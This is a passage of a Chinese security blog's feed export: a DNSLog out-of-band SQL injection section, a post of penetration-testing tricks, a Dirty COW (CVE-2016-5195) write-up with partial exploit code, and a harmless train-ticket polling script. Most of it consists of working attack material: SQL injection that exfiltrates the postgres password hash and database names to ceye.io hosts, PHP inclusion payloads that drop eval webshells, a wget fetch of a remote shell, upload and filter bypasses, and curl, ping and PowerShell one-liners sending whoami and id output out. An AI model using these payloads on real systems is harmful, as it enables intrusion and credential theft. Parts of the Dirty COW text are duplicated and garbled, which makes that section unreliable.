<p><strong>PostgreSQL</strong><br>PostgreSQL的声明COPY用于在文件系统的文件和表之间拷贝数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">DROP TABLE IF EXISTS table_output;</div><div class="line">CREATE TABLE table_output(content text);</div><div class="line">CREATE OR REPLACE FUNCTION temp_function()</div><div class="line">RETURNS VOID AS $$</div><div class="line">DECLARE exec_cmd TEXT;</div><div class="line">DECLARE query_result TEXT;</div><div class="line">BEGIN</div><div class="line">SELECT INTO query_result (SELECT passwd</div><div class="line">FROM pg_shadow WHERE usename=&apos;postgres&apos;);</div><div class="line">exec_cmd := E&apos;COPY table_output(content)</div><div class="line">FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;</div><div class="line">EXECUTE exec_cmd;</div><div class="line">END;</div><div class="line">$$ LANGUAGE plpgsql SECURITY DEFINER;</div><div class="line">SELECT temp_function();</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog4.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/dnslog5.png" alt=""></p>
<p>写个脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import urllib2</div><div class="line"></div><div class="line">for i in range(50):</div><div class="line">    if i==0:</div><div class="line">        continue</div><div class="line">    url = &apos;&apos;&apos;http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--&apos;&apos;&apos;</div><div class="line">    url = url.replace(&quot;dbid=1&quot;,&quot;dbid=&quot;+str(i))</div><div class="line">    req = urllib2.Request(url)</div><div class="line">    print req.get_full_url()</div><div class="line">    print urllib2.urlopen(req).read()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透测试的一些小技巧]]></title>
      <url>/2016/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>结合最近学习的知识，总结一下渗透测试中的一些小技巧，仅做参考。</p>
<a id="more"></a>
<h1 id="0x01-PHP文件包含"><a href="#0x01-PHP文件包含" class="headerlink" title="0x01 PHP文件包含"></a>0x01 PHP文件包含</h1><p><strong>利用网站文件上传功能:</strong>，比如上传头像之类，可以尝试包含上传的文件。</p>
<p><strong>利用php封装协议<code>php://input</code>和<code>data://</code>:</strong>，包含post数据造成php命令执行.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://example.com/test.php?url=php://input</div><div class="line">POST:&lt;?php fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&apos;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&apos;)?&gt;</div></pre></td></tr></table></figure>
<p><strong>包含log日志文件:</strong>当我们提交恶意代码时也会被记录，结合解析漏洞即可getshell(有读权限)。</p>
<p>apache日志默认在<code>/etc/httpd/logs/access_log</code>;</p>
<p>在日志文件中插入PHP代码</p>
<p>方法一 :使用burpsuit抓包访问 ，绕过浏览器编码&lt;&gt;</p>
<p>方法二 :curl 访问不存在的url</p>
<blockquote>
<p>curl <a href="http://example/shell.php?=" target="_blank" rel="external">http://example/shell.php?=</a>&lt;?php phpinfo();?&gt;  </p>
</blockquote>
<p>这样php代码就被写到log里面了 包含一下日志：</p>
<blockquote>
<p><a href="http://127.0.0.1/lfi/index.php?page=/etc/httpd/logs/access_log" target="_blank" rel="external">http://127.0.0.1/lfi/index.php?page=/etc/httpd/logs/access_log</a></p>
</blockquote>
<p><strong>包含/proc/self/environ文件:</strong>这需要PHP运行作为一个具有<code>cgion/proc</code>伪文件的系统且PHP脚本有权访问这些伪文件。</p>
<pre><code>填写User-Agent字段如下：&lt;?system(&apos;wget http://eyidaima/shell.txt -O shell.php&apos;);?&gt;
</code></pre><p><strong>包含会话文件:</strong>这需要攻击者能控制会话中的任何字符串值（注入代码，例如<code>phpinfo(）</code>，会话文件必须存放在serializedsession文件且PHP脚本能够访问会话文件（通常是<code>/tmp/sess_SESSIONID</code>文件）。</p>
<p><strong>包含其他由php应用创建的文件:</strong>只要你能想到的，都可以尝试创建,然后包含他，比如数据库文件，缓存文件，应用程序级别的日志。</p>
<h1 id="0x02-利用-htaccess文件绕过黑名单"><a href="#0x02-利用-htaccess文件绕过黑名单" class="headerlink" title="0x02 利用.htaccess文件绕过黑名单"></a>0x02 利用<code>.htaccess</code>文件绕过黑名单</h1><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。自定义<code>.htaccess</code>上传，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FileMatch “shell.jpg”&gt;  </div><div class="line">SetHandler application/x-httpd-php  </div><div class="line">&lt;/FileMatch&gt;</div></pre></td></tr></table></figure></p>
<p>同目录下，上传一个shell.jpg文件，内容是一句话，这个时候就成功绕过。</p>
<h1 id="0x03-PHP流封装绕过截断"><a href="#0x03-PHP流封装绕过截断" class="headerlink" title="0x03 PHP流封装绕过截断"></a>0x03 PHP流封装绕过截断</h1><p>技巧来源：王松</p>
<p>假设存在文件包含的代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">$a = $_GET[&apos;file&apos;];</div><div class="line">include $a.&apos;.html.php&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>但是我们<code>%00</code>无法截断, 只能包含<code>xxxx.html.php</code> 首先我们新建一个<code>hello.html.php</code>，内容为<code>phpinfo()</code>;</p>
<p>然后压缩成zip</p>
<p>然后访问如下网址,即可成功包含压缩文件内的<code>hello.html.php</code></p>
<p><code>http://example/index.php?file=zip://test.zip%23hello</code></p>
<p>把我们输入的变量和include后面的变量合起来就是<code>zip://test.zip#hello.html.php</code></p>
<p>代表当前目录下的<code>test.zip</code>压缩包里面的<code>hello.html.php</code>,于是就包含成功。</p>
<h1 id="0x04-通用防注入系统getshell"><a href="#0x04-通用防注入系统getshell" class="headerlink" title="0x04 通用防注入系统getshell"></a>0x04 通用防注入系统getshell</h1><p>很多人渗透测试的时候，发现防注入系统，比如说记录了ip，时间，提交数据等等，通过阅读类似程序的源码得知数据记录在<code>sqlin.asp</code>。</p>
<p>提交如下数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┼攠數畣整爠煥敵瑳∨≡┩愾           密码 a  (加密方式是:ANSI-&gt;Unicode；工具：UNICODE2ANSI)</div><div class="line"></div><div class="line">提交 and 1= ┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure></p>
<p>菜刀连接<code>sqlin.asp</code>即可。</p>
<h1 id="0x05-iis-php黑名单上传突破"><a href="#0x05-iis-php黑名单上传突破" class="headerlink" title="0x05 iis+php黑名单上传突破"></a>0x05 iis+php黑名单上传突破</h1><p>技巧来源：P牛</p>
<p>在php+window+iis环境下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">双引号==点号;</div><div class="line">大于符号==问号;</div><div class="line">小于符号(“&lt;”)==星号(“*”);</div></pre></td></tr></table></figure></p>
<p>该特性只能用于文件上传时覆盖已知的文件，于是这特性便略显鸡肋.不过P牛已经给出完美利用的方法：</p>
<p><strong>思路如下：</strong></p>
<ol>
<li>利用冒号“：”截断</li>
<li>利用“&lt;”==“*”覆盖上传文件</li>
</ol>
<p>我们都知道在文件上传时，我们往往会考虑到文件名截断，如<code>%00</code>,<code>:</code>去截断，如：<code>bypass.php:jpg</code><br>但是冒号截断产生的文件是空白的，里面并不会有任何的内容,虽然生成的php文件里面没有内容，但是php文件总生成了吧，所以我们可以结合上面所说的特性完美成功利用.</p>
<ol>
<li>首先利用冒号生成我们将要覆盖的php文件，上传文件名为<code>bypass.php:jpg</code>的文件，截断之后产生一个<code>bypass.php</code>的空白php文件。</li>
<li>利用上面的系统特性覆盖该文件：<code>&lt;</code>就等于 <code>*</code>,而<code>*</code>代表任意字符burp里修改文件名为<code>bypass.&lt;&lt;&lt;</code>内容为一句话，这样，就会生成一个带有一句话木马的<code>bypass.php</code>文件。</li>
</ol>
<h1 id="0x06-命令执行绕过"><a href="#0x06-命令执行绕过" class="headerlink" title="0x06 命令执行绕过"></a>0x06 命令执行绕过</h1><p>技巧来源：l3m0n</p>
<ol>
<li>escapeshellcmd：<code>escapeshellcmd()</code>对字符串中可能会欺骗 shell命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到<code>exec()</code>或<code>system()</code>函数，或者执行操作符之前进行转义为<code>^</code>,利用<code>%1a</code>，可以绕过过滤执行命令。</li>
<li><p>黑名单绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">执行ls命令：</div><div class="line">a=l;b=s;$a$b</div><div class="line">cat hello文件内容：</div><div class="line">a=c;b=at;c=he;d=llo;$a$b $&amp;#123;c&amp;#125;$&amp;#123;d&amp;#125;</div></pre></td></tr></table></figure>
</li>
<li><p>空格绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">绕过空格</div><div class="line">$&amp;#123;IFS&amp;#125;</div><div class="line">cat$&amp;#123;IFS&amp;#125;hello</div><div class="line">或者在读取文件的时候利用重定向符</div><div class="line">&lt;&gt;</div><div class="line">cat&lt;&gt;hello</div></pre></td></tr></table></figure>
</li>
<li><p>无回显<br>无回显获取数据的需求还是挺大的，比如sql，xxe，xss等等，这个时候一般可以用dns/http通道来获取数据。<br><strong>linux：</strong></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl xxxx.ceye.io/`whoami`</div><div class="line">ping -c 1 `whoami`.xxxx.ceye.io</div><div class="line">特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64</div><div class="line">curl http://xxxx.ceye.io/$(id|base64)</div></pre></td></tr></table></figure>
<p><strong>windows:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http请求：</div><div class="line">for /F %x in (&apos;whoami&apos;) do start http://xxx.ceye.io/%x</div><div class="line">dns请求：</div><div class="line">获取计算机名：for /F &quot;delims=\&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info</div><div class="line">获取用户名：for /F &quot;delims=\ tokens=2&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info</div><div class="line">用powershell来base64数据</div><div class="line">for /F %x in (&apos;whoami&apos;) do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&apos;%x&apos;));$b=New-Object System.Net.WebClient;$b.DownloadString(&apos;http://xxx.ceye.io/&apos;+$a);</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> linux </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[“脏牛”漏洞浅析与复现]]></title>
      <url>/2016/11/02/%E2%80%9C%E8%84%8F%E7%89%9B%E2%80%9C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Wirte）时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞<br><a id="more"></a><br><strong>漏洞编号：</strong>CVE-2016-5195</p>
<p><strong>漏洞类型：</strong>内核竞态条件漏洞</p>
<p><strong>漏洞危害：</strong>低权限用户利用该漏洞技术可以在全版本Liux系统上实现本地提权</p>
<p><strong>影响范围：</strong>Linux内核&gt;=2.6.22(07年以后的)</p>
<h1 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h1><p><a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="external">POC地址</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow1.png" alt=""></p>
<p>只要Linux内核&gt;=2.6.22即可</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow3.png" alt=""></p>
<p><code>gcc</code>命令是一个编译器套件，可用于编译多种语言源码.</p>
<p>编译选项中指定<code>-pthread</code> 会附加一个宏定义 <code>-D_REENTRANT</code>该宏会导致 <code>libc</code> 头文件选择那些<code>thread-safe</code>的实现。<code>-o</code>参数为编译后输出文件名。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow4.png" alt=""></p>
<p>执行命令进行将Dirty_COW字符串保存到<code>readfile</code>文件内(写入文件名和内容可自定义，但是如果该文件内容为空，会导致POC测试<strong><code>失败</code></strong>)</p>
<p><code>0404</code>代表所有用户默认情况下对该文件只有读取权限，无法修改删除</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow5.png" alt=""></p>
<p>通过<code>./</code>文件名 方式是执行该文件命令 后面一般附加空格参数。</p>
<p>执行dirtyc0w文件  <code>readfile</code> 是文件名参数 <code>m00000...</code>为利用漏洞写入的值.</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/cow6.png" alt=""></p>
<p>发现该文件已被输入的字符串<code>m0000...</code>覆盖</p>
<h1 id="0x02-漏洞形成原因"><a href="#0x02-漏洞形成原因" class="headerlink" title="0x02 漏洞形成原因"></a>0x02 漏洞形成原因</h1><p><strong>Linux写时拷贝技术(copy-on-write)</strong></p>
<p>在Linux程序中，fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。</p>
<p> <strong>竞态条件</strong></p>
<p>竞态条件（race condition）是指设备或系统出现不恰当的执行时序，而得到不正确的结果。</p>
<p>inux内存管理–缺页异常处理</p>
<p>触发异常的线性地址处于用户空间的vma中，但还未分配物理页，如果访问权限OK的话内核就给进程分配相应的物理页。</p>
<p>触发异常的线性地址不处于用户空间的vma中，这种情况得判断是不是因为用户进程的栈空间消耗完而触发的缺页异常。</p>
<p>如果 是的话则在用户空间对栈区域进行扩展，并且分配相应的物理页，如果不是则作为一次非法地址访问来处理，内核将终结进程</p>
<p><strong>缺页中断 </strong></p>
<p>缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。在这个时候，被内存映射的文件实际上成了一个分页交换文件。</p>
<h1 id="0x03-触发原理："><a href="#0x03-触发原理：" class="headerlink" title="0x03 触发原理："></a>0x03 触发原理：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">void *madviseThread(void *arg)</div><div class="line">&#123;</div><div class="line">  char *str;</div><div class="line">  str=(char*)arg;</div><div class="line">  int i,c=0;</div><div class="line">  for(i=0;i&lt;100000000;i++)</div><div class="line">  &#123;</div><div class="line">/*</div><div class="line">You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661</div><div class="line">&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call</div><div class="line">&gt; while having the page of the executable mmapped in memory.</div><div class="line">*/</div><div class="line">    c+=madvise(map,100,MADV_DONTNEED);</div><div class="line">  &#125;</div><div class="line">  printf(&quot;madvise %d\n\n&quot;,c);</div><div class="line">&#125;</div><div class="line"> </div><div class="line">void *procselfmemThread(void *arg)</div><div class="line">&#123;</div><div class="line">  char *str;</div><div class="line">  str=(char*)arg;</div><div class="line">/*</div><div class="line">You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16</div><div class="line">&gt;  The in the wild exploit we are aware of doesn&apos;t work on Red Hat</div><div class="line">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</div><div class="line">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</div><div class="line">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</div><div class="line">*/</div><div class="line">  int f=open(&quot;/proc/self/mem&quot;,O_RDWR);</div><div class="line">  int i,c=0;</div><div class="line">  for(i=0;i&lt;100000000;i++) &#123;</div><div class="line">/*</div><div class="line">You have to reset the file pointer to the memory position.</div><div class="line">*/</div><div class="line">    lseek(f,(uintptr_t) map,SEEK_SET);</div><div class="line">    c+=write(f,str,strlen(str));</div><div class="line">  &#125;</div><div class="line">  printf(&quot;procselfmem %d\n\n&quot;, c);</div><div class="line">&#125;</div><div class="line"> </div><div class="line"> </div><div class="line">int main(int argc,char *argv[])</div><div class="line">&#123;</div><div class="line">/*</div><div class="line">You have to pass two arguments. File and Contents.</div><div class="line">*/</div><div class="line">  if (argc&lt;3) &#123;</div><div class="line">  (void)fprintf(stderr, &quot;%s\n&quot;,</div><div class="line">      &quot;usage: dirtyc0w target_file new_content&quot;);</div><div class="line">  return 1; &#125;</div><div class="line">  pthread_t pth1,pth2;</div><div class="line">/*</div><div class="line">You have to open the file in read only mode.</div><div class="line">*/</div><div class="line">  f=open(argv[1],O_RDONLY);</div><div class="line">  fstat(f,&amp;st);</div><div class="line">  name=argv[1];</div></pre></td></tr></table></figure>
<p>调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。</p>
<p>第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的,如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。&amp;oq=调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的.如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。</p>
<p>但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen,MADV_DONTNEED),其中addr~addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen,MADV_DONTNEED),其中addr~addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。</p>
<h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><p>升级对应版本.</p>
]]></content>
      
        
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 提权 </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python实现12306车票查询]]></title>
      <url>/2016/10/10/Python%E5%AE%9E%E7%8E%B012306%E8%BD%A6%E7%A5%A8%E6%9F%A5%E8%AF%A2/</url>
      <content type="html"><![CDATA[<p>今天准备给师傅一块去应急响应，票都定好了，发现忘带身份证了，MDZZ…所以我就这样错失了一次宝贵的机会…更™可恶的是我去退票，竟然给我说没有身份证退不了。。。我特么的要是有身份证，我还退你大爷啊。。。</p>
<p>所以想搞它，一想，算了，凭我这本事搞12306还是别装逼，所以就有了这个脚本。。。<br><a id="more"></a><br>源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@博客：http://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import urllib2</div><div class="line">import json</div><div class="line">import smtplib</div><div class="line">import time</div><div class="line">import codecs</div><div class="line">from email.mime.text import MIMEText</div><div class="line">import ssl</div><div class="line"></div><div class="line"># 记录日志</div><div class="line">def log(content):</div><div class="line">    t = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;)</div><div class="line">    f = codecs.open(&apos;watcher.log&apos;, &apos;a&apos;, &apos;utf-8&apos;)</div><div class="line">    f.write(&apos;[%s]%s\n&apos; % (t, content))</div><div class="line">    f.close()</div><div class="line"></div><div class="line"># 发送邮件</div><div class="line">def send_mail(content):</div><div class="line">    to_list=[&apos;xxx@qq.com&apos;] </div><div class="line">    mail_host = &apos;smtp.163.com&apos; </div><div class="line">    mail_user = &apos;xxx&apos; </div><div class="line">    mail_pass = &apos;xxx&apos;   </div><div class="line">    mail_postfix = &apos;163.com&apos; </div><div class="line">    me = &quot;TicketsWatcher&quot;+&quot;&lt;&quot;+mail_user+&quot;@&quot;+mail_postfix+&quot;&gt;&quot;</div><div class="line">    msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;)</div><div class="line">    msg[&apos;Subject&apos;] = &apos;There are some tickets you need.&apos;</div><div class="line">    msg[&apos;From&apos;] = me</div><div class="line">    msg[&apos;To&apos;] = &quot;;&quot;.join(to_list)</div><div class="line">    server = smtplib.SMTP()</div><div class="line">    server.connect(mail_host)</div><div class="line">    server.ehlo()</div><div class="line">    server.starttls()</div><div class="line">    server.login(mail_user,mail_pass)</div><div class="line">    server.sendmail(me, to_list, msg.as_string())</div><div class="line">    server.close()</div><div class="line">    log(&apos;sent mail successfully&apos;)</div><div class="line"></div><div class="line">try:</div><div class="line">    # 请求地址根据实际要抓取的页面修改，参数包括日期、出发站、到达站</div><div class="line">    ssl._create_default_https_context = ssl._create_unverified_context</div><div class="line">    resp = urllib2.urlopen(&quot;https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-11&amp;from_station=NJH&amp;to_station=SHH&quot;)</div><div class="line">    #print resp</div><div class="line">    result = resp.read()</div><div class="line">    #print result</div><div class="line">    data = json.loads(result)</div><div class="line">    datas = data[&apos;data&apos;][&apos;datas&apos;]</div><div class="line">    print datas</div><div class="line">    for d in datas:</div><div class="line">        if d[&apos;station_train_code&apos;] == &apos;T135&apos;:  </div><div class="line">            content = &apos;tickes for hard seat of %s: %s&apos; % (d[&apos;station_train_code&apos;], d[&apos;yz_num&apos;])</div><div class="line">            log(content)</div><div class="line">            if unicode(d[&apos;yz_num&apos;]) != u&quot;无&quot;:</div><div class="line">                send_mail(content)  </div><div class="line">            break</div><div class="line">except Exception, e:</div><div class="line">    content = &apos;somethings wrong with the program:\n&apos; + str(e)</div><div class="line">    log(content)</div><div class="line">    send_mail(content)</div></pre></td></tr></table></figure></p>
<p><strong>测试结果：</strong><br><img src="http://oa8y5guqs.bkt.clouddn.com/12306_1.png" alt=""><br><img src="http://oa8y5guqs.bkt.clouddn.com/12306_2.png" alt=""><br><strong>说明：</strong></p>
<p>脚本分为三部分：</p>
<ul>
<li>记录日志</li>
<li>发送邮件</li>
<li>车票信息捕捉</li>
</ul>
<p>记录日志会在脚本目录下生成一个<code>watch.log</code>文件，这个主要是得结合实时捕捉数据，你可以定时也可以使用<code>crontab</code>,这里我就没在加了(还有十个网站没测呢，政府网站真是尼玛啊，谁有比较好的经验望大牛们不吝分享，不说了都是泪…)</p>
